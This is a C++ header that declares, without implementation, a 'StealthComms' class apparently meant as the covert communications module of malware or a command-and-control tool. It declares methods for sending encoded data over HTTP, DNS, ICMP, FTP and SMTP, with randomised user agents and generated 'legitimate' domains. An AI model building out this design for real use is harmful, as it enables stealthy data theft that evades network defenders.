#ifndef STEALTHCOMMS_H
#define STEALTHCOMMS_H

#include "communication/BaseComms.h"
#include <string>
#include <vector>

class Configuration;

class StealthComms : public BaseComms {
public:
    explicit StealthComms(Configuration* config);
    ~StealthComms();
    
    bool Initialize() override;
    bool SendData(const std::vector<uint8_t>& data) override;
    void Cleanup() override;
    bool TestConnection() const override;
    std::vector<uint8_t> ReceiveData() override;
    
private:
    bool SendViaHTTP(const std::vector<uint8_t>& data);
    bool SendViaDNS(const std::vector<uint8_t>& data);
    bool SendViaICMP(const std::vector<uint8_t>& data);
    bool SendViaFTP(const std::vector<uint8_t>& data);
    bool SendViaSMTP(const std::vector<uint8_t>& data);
    
    std::vector<uint8_t> EncodeData(const std::vector<uint8_t>& data);
    std::vector<uint8_t> DecodeData(const std::vector<uint8_t>& data);
    
    std::string GenerateRandomUserAgent() const;
    std::string GenerateLegitimateDomain() const;
    
    std::string m_currentMethod;
    std::vector<std::string> m_availableMethods;
    Configuration* m_config;
};

#endif